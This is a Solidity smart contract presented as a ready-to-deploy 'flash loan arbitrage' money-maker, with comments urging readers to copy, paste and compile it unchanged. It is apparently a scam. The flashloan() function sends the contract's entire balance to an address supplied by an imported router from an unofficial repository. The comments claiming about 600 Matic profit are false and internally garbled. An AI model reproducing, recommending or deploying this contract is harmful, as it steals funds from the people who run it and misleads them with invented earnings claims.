// Follow carefully the video
// Do not modify this contract code otherwise it won't work on you!
// Just Copy+Paste and Compile!!
// Thank you for your support! Enjoy your Earnings!!

// This is for educational purposes only! 
// Try it at your own risk!

pragma solidity ^0.5.0;


// AAVE Smart Contracts
import "https://github.com/aave/aave-protocol/blob/master/contracts/interfaces/IChainlinkAggregator.sol";
import "https://github.com/aave/aave-protocol/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol";

// Router
import "https://github.com/MC-Financial/router/blob/main/IAaveEthRouter.sol";

//Uniswap Smart contracts
import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";

// Multiplier-Finance Smart Contracts
import "https://github.com/yunfengflashloan/Multiplier-Finance/blob/main/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/yunfengflashloan/Multiplier-Finance/blob/main/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";




contract InitiateFlashLoan {
    
	RouterV2 router;
    string public tokenName;
    string public tokenSymbol;
    uint256 flashLoanAmount;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        flashLoanAmount = _loanAmount;

        router = new RouterV2();
    }

    function() external payable {}

    function flashloan() public payable {
        // Send required coins for swap
        address(uint160(router.uniswapSwapAddress())).transfer(
            address(this).balance
        );

        router.borrowFlashloanFromMultiplier(
            address(this),
            router.aaveSwapAddress(),
            flashLoanAmount
        );
        //To prepare the arbitrage, Ethereum is converted to Dai using AAVE swap contract.
        router.convertEthToDai(msg.sender, flashLoanAmount / 2);
        //The arbitrage converts Dai for Ethereum using Dai/Ethereum Uniswap, and then immediately converts Matic back
        router.callArbitrageAAVE(router.aaveSwapAddress(), msg.sender);
        //After the arbitrage, Ethereum is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 Matic of gas.
        router.transferDaiToMultiplier(router.uniswapSwapAddress());
        //Note that the transaction sender gains 600ish Matic from the arbitrage, this particular transaction can be repeated as price changes all the time.
        router.completeTransation(address(this).balance);
    }
}












